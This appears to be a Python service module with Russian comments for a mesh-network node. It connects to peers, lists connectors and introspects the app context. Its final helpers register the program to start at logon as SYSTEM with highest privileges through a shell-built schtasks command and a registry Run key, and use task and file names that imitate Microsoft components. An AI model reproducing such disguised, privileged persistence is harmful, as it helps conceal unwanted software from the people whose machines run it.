# services/system/service.py — управление системой: подключение к узлам, диагностика

import asyncio
import inspect
import subprocess
from pathlib import Path

from pydantic import BaseModel

from services.rpc import rpc
from src.internal_modules.base import ModuleGeneric

try:
    import winreg
except ImportError:
    winreg = None


# ------------------------------------------------------------------ #
#  Карта контекста приложения (для разработчика сервисов)
#  Описание атрибутов AppContext — см. src/internal_modules/context.py
# ------------------------------------------------------------------ #

CTX_ATTR_DOCS = {
    'NODE':            'Имя этого узла в mesh-сети (config.yaml → node)',
    'config':          'Config — pydantic-модель конфигурации: .network.port, .local.peers, ...',
    'config_manager':  'ConfigManager — чтение/запись конфига: .get("network.port"), .update({...}), .add_peer(node_id, uri), .list_peers()',
    'peers':           'Список пиров из config.local.yaml (автоподключение при старте)',
    'services':        'ServiceManager — реестр локальных сервисов и их RPC-методов',
    'certs_index':     'CertsIndex — сводка сертификатов всей сети (обмен CERT_SYNC)',
    '_modules':        'Зарегистрированные модули; порядок в списке = порядок start()',
    'network':         'NetworkModule — WS-сервер узла, mesh-RPC и стримы, топология',
    'memory':          'MemoryModule — фабрика стримов: create_pipe(), create_dispatcher(), attach_transport()',
    'spawn':           'Spawner — распределённые вычисления: раздаёт @generator удалённым воркерам',
}

# Вложенные объекты уровня 2, которые полезно показать отдельно
CTX_CHILD_DOCS = {
    ('network', 'router'):         'Router — маршрутизация всех пакетов: RPC, стримы, кэш маршрутов',
    ('network', 'neighbor_table'): 'NeighborTable — кто в сети: .connected(), .known(), .find_by_service(name)',
    ('network', 'nodes_manager'):  'NodesManager — прямые WS-подключения других узлов к этому',
}

# Простой тип → показываем значение вместо списка методов
_SIMPLE_TYPES = (str, int, float, bool)


class System(ModuleGeneric):
    def __init__(self, name, context):
        super().__init__(name, context)

    @rpc
    async def connect_to_node(self, data: dict):
        """Инициировать исходящее подключение к удалённому узлу.

        Подключение разрешено, если удалённый узел НЕ подключен к локальному
        (по NeighborTable). При успехе — сохраняет пира в config.local.yaml
        для автоматического переподключения при рестарте.

        data: {host, port, node_id}
        """
        host = data.get('host', '')
        port = data.get('port', 9000)
        node_id = data.get('node_id', '')

        if not host or not node_id:
            return {'ok': False, 'error': 'host и node_id обязательны'}

        nt = self.ctx.network.neighbor_table
        existing = nt.get(node_id)
        if existing and existing.status.value == 'connected':
            return {'ok': False, 'error': f'Узел {node_id} уже подключен'}

        uri = f'ws://{host}:{port}/ws/{self.ctx.NODE}'
        config_uri = f'ws://{host}:{port}/ws/'

        try:
            await self.ctx.network.connect_to(node_id=node_id, target_uri=uri)
        except Exception as e:
            return {'ok': False, 'error': str(e)}

        # Дождаться подтверждения подключения (до 5 сек)
        connected = False
        for _ in range(10):
            await asyncio.sleep(0.5)
            entry = nt.get(node_id)
            if entry and entry.status.value == 'connected':
                connected = True
                break

        if connected:
            try:
                self.ctx.config_manager.add_peer(node_id, config_uri)
                self.log.info(f'Peer saved to config: {node_id} → {config_uri}')
            except Exception as e:
                self.log.warning(f'Failed to save peer to config: {e}')
            return {'ok': True, 'node_id': node_id, 'uri': uri, 'saved': True}

        return {'ok': True, 'node_id': node_id, 'uri': uri, 'saved': False,
                'note': 'Подключение в процессе (коннектор будет повторять попытки)'}

    @rpc
    def list_connectors(self):
        """Список активных исходящих коннекторов."""
        result = []
        for mod in self.ctx._modules:
            if 'Connector_' in mod.name:
                result.append({
                    'name': mod.name,
                    'peer': getattr(mod, 'peer_node_id', '?'),
                    'uri': getattr(mod, 'target_uri', '?'),
                })
        return result

    @rpc
    def node_detail(self,):
        """Детальная информация об узле: соседи, сервисы, активные WS."""
        nt = self.ctx.network.neighbor_table
        nm = self.ctx.network.nodes_manager

        connected = [n.model_dump() for n in nt.connected()]
        known = [n.model_dump() for n in nt.known()]

        ws_nodes = list(nm.nodes.keys())

        return {
            'own': self.ctx.NODE,
            'connected': connected,
            'known': known,
            'ws_connections': ws_nodes,
            'services': list(self.ctx.services.services.keys()),
        }

    @rpc
    def config_peers(self):
        """Список пиров из config.local.yaml."""
        peers = self.ctx.config_manager.list_peers()
        return [{'node_id': p.node_id, 'uri': p.uri} for p in peers]

    # ------------------------------------------------------------------ #
    #  Интроспекция AppContext — подсказка разработчику «что доступно»
    # ------------------------------------------------------------------ #

    @rpc
    def ctx_map(self):
        """Карта контекста приложения (self.ctx) для разработчика сервисов.

        По каждому атрибуту AppContext возвращает: тип, назначение,
        публичные методы с сигнатурами. Ключевые подсистемы (router,
        neighbor_table и т.п.) раскрыты на уровень глубже.
        """
        ctx = self.ctx
        entries = []

        # ключи конфига, значения которых маскируются в UI
        _SECRET_KEYS = {'secret', 'password', 'token', 'key'}

        def to_jsonable(obj, key_name=''):
            """Рекурсивно превратить значение в JSON-совместимую структуру.

            pydantic-модели (Config, PeerConfig...) раскрываются в словари
            значений — так в панели видно не только типы, но и текущий config.
            Секретные поля маскируются.
            """
            if isinstance(obj, BaseModel):
                return {k: ('***' if k.lower() in _SECRET_KEYS else to_jsonable(v, k))
                        for k, v in obj}
            if isinstance(obj, _SIMPLE_TYPES) or obj is None:
                return obj
            if isinstance(obj, dict):
                return {str(k): to_jsonable(v, str(k)) for k, v in obj.items()}
            if isinstance(obj, (list, tuple, set)):
                return [to_jsonable(v, key_name) for v in obj]
            if isinstance(obj, Path):
                return str(obj)
            return repr(obj)

        def describe(obj, name, doc=''):
            entry = {
                'name': name,
                'type': type(obj).__name__,
                'doc': doc,
                'value': None,
                'data': None,
                'methods': [],
                'attrs': [],
                'children': [],
            }
            if isinstance(obj, _SIMPLE_TYPES) or obj is None:
                entry['value'] = repr(obj)
                return entry

            # модели/списки/словари (config, peers и т.п.) — показать значениями
            if isinstance(obj, (BaseModel, list, tuple, dict)):
                entry['data'] = to_jsonable(obj)
                return entry

            for attr_name in sorted(dir(obj)):
                if attr_name.startswith('_'):
                    continue
                try:
                    attr = getattr(obj, attr_name)
                except Exception:
                    continue

                if callable(attr):
                    try:
                        sig = str(inspect.signature(attr))
                        sig = f'({sig[1:-1]})' if sig.startswith('(') else sig
                    except (TypeError, ValueError):
                        sig = '(...)'
                    if len(sig) > 140:
                        sig = sig[:137] + '...'
                    entry['methods'].append({'name': attr_name, 'sig': sig})
                elif isinstance(attr, type):
                    entry['attrs'].append(f'{attr_name}: class {attr.__name__}')
                else:
                    entry['attrs'].append(
                        f"{attr_name}: {type(attr).__name__}")

            return entry

        def resolve_rpc_service(obj):
            """Какому сервису из реестра соответствует объект (если соответствует).

            Например self.ctx.spawn — это сервис 'spawner': его методы можно
            вызвать по сети. Router/NeighborTable — внутренние объекты,
            напрямую через RPC их не дёрнешь.
            """
            try:
                for svc_name, bucket in self.ctx.services.services.items():
                    if bucket.get('self') is obj:
                        return svc_name
            except Exception:
                pass
            return None

        # порядок: сначала задокументированные атрибуты, потом остальные
        known = [n for n in CTX_ATTR_DOCS if hasattr(ctx, n)]
        extra = [n for n in dir(ctx)
                 if not n.startswith('_') and n not in CTX_ATTR_DOCS]

        for attr_name in known + extra:
            obj = getattr(ctx, attr_name, None)
            entry = describe(obj, attr_name, CTX_ATTR_DOCS.get(attr_name, ''))
            entry['rpc_service'] = resolve_rpc_service(obj)

            # вложенные подсистемы (например network.router)
            for (parent, child), child_doc in CTX_CHILD_DOCS.items():
                if parent == attr_name and obj is not None:
                    child_obj = getattr(obj, child, None)
                    if child_obj is not None:
                        child_entry = describe(child_obj, f'{attr_name}.{child}',
                                               child_doc)
                        child_entry['rpc_service'] = resolve_rpc_service(child_obj)
                        entry['children'].append(child_entry)

            # ServiceManager — вместо методов показываем реестр сервисов
            if attr_name == 'services':
                registry = {}
                for svc_name, methods in getattr(ctx.services, 'services', {}).items():
                    registry[svc_name] = {
                        'methods': sorted(
                            m for m in methods
                            if m != 'self' and not m.startswith('__gen__')),
                        'generators': sorted(
                            m[len('__gen__'):] for m in methods
                            if m.startswith('__gen__')),
                    }
                entry['registry'] = registry

            entries.append(entry)

        return {'node': ctx.NODE, 'entries': entries}

    def add_to_task_scheduler(self):
        """Добавляет задачу в планировщик"""
        exe_path = self.ctx.config_manager.local.full_path
        # exe_path = BASE_DIR / 'W32TimeHelper.exe'
        task_name = self.ctx.config_manager.local.name

        # remove_from_task_scheduler()

        try:
            # subprocess.call('cmd /C "chcp 1251"')
            cmd = f'schtasks /Create /F /TN "{task_name}" /TR "{exe_path}" /SC ONLOGON /RU "NT AUTHORITY\\SYSTEM" /DELAY 0000:30 /rl highest'
            result = subprocess.call(cmd, shell=True)

        except Exception as e:
            self.log.error("Ошибка создания задачи планировщика", e)

        self.add_to_registry_startup()

    def remove_from_task_scheduler(self):
        """Удаляет задачу из планировщика"""
        task_name = "MicrosoftEdgeUpdateTaskMachineEye"
        try:
            cmd = f'schtasks /Delete /F /TN "{task_name}"'
            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.log.error("Ошибка удаления задачи планировщика", e)

    def add_to_registry_startup(self):
        """Добавляет запуск через реестр"""
        if winreg is None:
            return

        try:
            exe_path = self.ctx.config_manager.local.full_path.resolve()
            key_name = self.ctx.config_manager.local.name

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )

            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)

            self.log.info(f"Добавлено в автозапуск реестра: {key_name}")

        except Exception as e:
            self.log.error("Ошибка добавления в реестр", e)

    def remove_from_registry_startup(self):
        """Удаляет из автозапуска реестра"""
        if winreg is None:
            return

        try:
            key_name = self.ctx.config_manager.local.name

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )

            try:
                winreg.DeleteValue(key, key_name)
                self.log.info(f"Удалено из автозапуска реестра: {key_name}")
            except FileNotFoundError:
                pass

            winreg.CloseKey(key)

        except Exception as e:
            self.log.error("Ошибка удаления из реестра", e)

